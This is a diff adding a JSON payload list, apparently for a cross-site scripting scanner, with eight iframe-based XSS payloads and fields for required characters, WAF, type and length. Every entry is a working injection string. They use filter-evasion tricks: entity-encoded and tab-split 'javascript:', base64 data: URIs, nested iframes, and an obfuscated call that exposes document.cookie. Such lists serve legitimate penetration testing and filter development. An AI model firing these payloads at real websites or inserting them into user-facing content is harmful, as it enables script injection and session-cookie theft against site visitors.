@@ -1,0 +1,133 @@
+[
+  {
+    "Payload": "<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>",
+    "Attribute": [
+      ">",
+      "<",
+      ";",
+      "&",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 71
+  },
+  {
+    "Payload": "<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>",
+    "Attribute": [
+      ">",
+      "<",
+      ";",
+      "/",
+      "&",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 76
+  },
+  {
+    "Payload": "<iframe/src=data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=></iframe>",
+    "Attribute": [
+      ">",
+      "<",
+      ";",
+      "/",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 84
+  },
+  {
+    "Payload": "<iframe src=java&Tab;sc&Tab;ript:al&Tab;ert()></iframe>",
+    "Attribute": [
+      ">",
+      ")",
+      "<",
+      ";",
+      "/",
+      "(",
+      "&",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 55
+  },
+  {
+    "Payload": "<iframe src=\"java sc ript:al ert()\"></iframe>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 45
+  },
+  {
+    "Payload": "<iframe src=data:text/html,<iframe src=\"data:text/html;base64,PD8+PD8+TT9MSz9KSyNAJDpMQCNKXkBePHNjcmlwdD5hbGVydCgnQml0QmFyZyA6KScpOzwvc2NyaXB0Pgo=\">",
+    "Attribute": [
+      "\"",
+      ">",
+      "<",
+      ";",
+      "/",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 148
+  },
+  {
+    "Payload": "<iframe srcdoc=\"<script>top[//.source+//ert//.source](document.cookie)</script>\"></iframe>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 90
+  },
+  {
+    "Payload": "<iframe/src=\"data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\">",
+    "Attribute": [
+      "\"",
+      ">",
+      "<",
+      ";",
+      "/",
+      "&",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 79
+  }
+]
